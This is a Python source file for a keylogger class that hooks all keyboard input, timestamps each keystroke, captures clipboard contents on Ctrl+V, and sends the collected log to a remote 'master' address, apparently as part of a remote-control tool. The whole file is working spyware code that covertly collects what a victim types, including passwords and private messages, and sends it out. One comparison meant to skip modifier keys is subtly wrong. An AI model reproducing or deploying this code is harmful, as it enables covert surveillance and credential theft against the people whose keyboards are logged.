import time
import keyboard
import pyperclip
from io import StringIO


class KeyLog:
    def __init__(self):
        self.buffer = StringIO()
        self.shift_pressed = False
        self.ctrl_pressed = False
        self.last_key_time = time.time()
        self.start_logging()

    def log_key(self, event):
        current_time = time.time()
        key_name = event.name

        if key_name == ['caps lock', 'shift', 'right shift', 'alt', 'right alt']:
            return

        timestamp = time.strftime("%d/%m/%y %H:%M:%S", time.localtime())

        # If the buffer is empty, append the timestamp
        if self.buffer.tell() == 0:
            self.buffer.write(f'{timestamp} - ')

        if current_time - self.last_key_time > 5 and key_name != 'enter':
            self.buffer.write(f'\n\n {timestamp} - ')

        if key_name == 'space':
            self.buffer.write(' ')
        elif key_name == 'enter':
            self.buffer.write('\n')
        elif key_name == 'backspace':
            self.buffer.seek(self.buffer.tell() - 1)  # Move the buffer position back by one
            self.buffer.truncate()  # Remove the last character
        elif key_name == 'shift' or key_name == 'right shift':
            return
        elif key_name in ['ctrl', 'right ctrl']:
            self.ctrl_pressed = True
        else:
            if self.ctrl_pressed and key_name == 'v':
                clipboard_content = pyperclip.paste()
                self.buffer.write(clipboard_content)
                self.ctrl_pressed = False
            else:
                self.buffer.write(key_name)

        self.last_key_time = current_time

    def start_logging(self):
        keyboard.on_press(self.log_key)

    def dump_keys(self, master, address):
        try:
            self.buffer.seek(0)  # Move the buffer position to the beginning
            keys_bytes = self.buffer.read().encode('utf-8')
            current_time = time.localtime()
            timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)
            file_name = f'keys_{timestamp}.txt'
            master.send_file_to_master(address, file_name, keys_bytes)
        finally:
            self.buffer.close()  # Close the buffer even if an exception occurs
            self.buffer = StringIO()
